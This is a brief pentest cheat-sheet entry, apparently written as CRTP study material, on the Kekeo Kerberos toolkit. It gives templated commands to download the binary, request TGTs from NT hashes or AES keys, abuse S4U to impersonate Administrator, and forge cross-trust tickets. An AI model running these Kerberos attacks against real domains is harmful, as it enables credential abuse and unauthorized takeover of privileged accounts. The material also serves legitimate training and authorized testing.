# 03.17 Kekeo

> Kerberos toolkit — companion to Mimikatz for ticket operations the Mimikatz kerberos module does not cover.

## Overview

Kekeo (gentilkiwi) does Kerberos-specific operations that Mimikatz historically lacked or did less cleanly: S4U2Self/S4U2Proxy chains, ASKtgt with various encryption types, base/exchange of tickets, trust attacks. Some of Kekeo's features are now also in Rubeus — but Kekeo remains the original reference implementation and is still used in CRTP material.

## Steps

- **Step 1** - Get binary.
- **Step 2** - Run kekeo.exe.
- **Step 3** - Use modules: tgt, tgs, exploit, smb.

## Commands

### Get binary

```powershell
iwr 'https://github.com/gentilkiwi/kekeo/raw/master/kekeo/Win32/kekeo.exe' -OutFile kekeo.exe
```

### Run

```cmd
kekeo.exe
```

### Ask TGT with explicit key

```kekeo
tgt::ask /user:<USER> /domain:<DOMAIN> /rc4:<NT-HASH>
tgt::ask /user:<USER> /domain:<DOMAIN> /aes256:<AES256>
```

### S4U abuse

```kekeo
tgs::s4u /tgt:<USER>.kirbi /user:Administrator@<DOMAIN> /service:cifs/<TARGET>
```

### Inter-realm ticket (cross-trust)

```kekeo
tgt::ask /user:<USER> /domain:<DOMAIN> /password:<PASS> /service:krbtgt/<TRUSTED-DOMAIN>
```
